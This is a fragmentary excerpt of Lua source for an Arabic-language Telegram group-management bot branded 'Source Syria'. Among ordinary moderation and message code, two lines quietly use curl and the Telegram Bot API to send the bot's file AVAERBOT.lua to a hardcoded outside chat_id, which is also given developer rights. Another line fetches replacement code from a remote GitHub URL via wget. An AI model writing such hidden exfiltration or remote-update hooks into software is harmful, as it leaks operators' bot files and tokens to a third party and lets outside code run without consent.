...
Ids_Dev = {Id_Dev,bot_id,1726705278,1465250253}
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1726705278 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curlm) 
...
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1726705278 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curla)
...
local text1 = redis:get(bot_id..'NightRang:new:sourse1') or '≪━━━━━━ＳＯＵＲＳＥ ＳＩＲＩＡ †࿃━━━━━━≫'
local text2 = redis:get(bot_id..'NightRang:new:sourse2') or '❃∫'
text = string.gsub(text,"≪━━━━━━ＳＯＵＲＳＥ ＳＩＲＩＡ †࿃━━━━━━≫",text1)
...
send(msg.chat_id_,0, "❃∫عذرا يا ⇠ ["..data.first_name_.."](T.ME/SOURCE_SYRIA)\n❃∫ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('wget https://raw.githubusercontent.com/ahmedsiria/NightRang/master/NightRang.lua')
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n≪━━━━━━ＳＩＲＩＡ †࿃━━━━━━≫ٴ\n❃∫ [☉ ＳＩＲＩＡ †࿃ ☉️](http://t.me/SOURCE_SYRIA) ❃∫')
end
...
{{text = '𝗢𝗥𝗔𝗕𝗜 𖢌 ', url="t.me/DEV_ORABI"}},
